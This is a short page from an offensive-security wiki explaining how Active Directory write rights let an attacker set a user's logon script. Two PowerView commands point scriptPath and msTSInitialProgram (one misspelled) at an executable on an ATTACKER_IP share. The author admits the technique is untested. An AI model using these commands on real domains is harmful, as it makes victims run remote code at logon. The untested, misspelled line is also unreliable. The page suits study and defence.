# Logon script

{% hint style="danger" %}
It is worth noting that during my tests, I couldn't find a way to practice this scenario. Since I didn't find practical enough resources on the Internet, feel free to reach out if you manage to exploit this.

This abuse can be carried out when controlling an object that has a `GenericAll` or `GenericWrite` over the target, or a `WriteProperty` premission over the target's logon script attribute (i.e. `scriptPath` or `msTSInitialProgram`).

The attacker can make the user execute a custom script at logon. This can be achieved with [Set-DomainObject](https://powersploit.readthedocs.io/en/latest/Recon/Set-DomainObject/) ([PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1) module).

```bash

Set-DomainObject testuser -Set @{'msTSTnitialProgram'='\\ATTACKER_IP\share\run_at_logon.exe'} -Verbose

Set-DomainObject testuser -Set @{'scriptPath'='\\ATTACKER_IP\share\run_at_logon.exe'} -Verbose
```
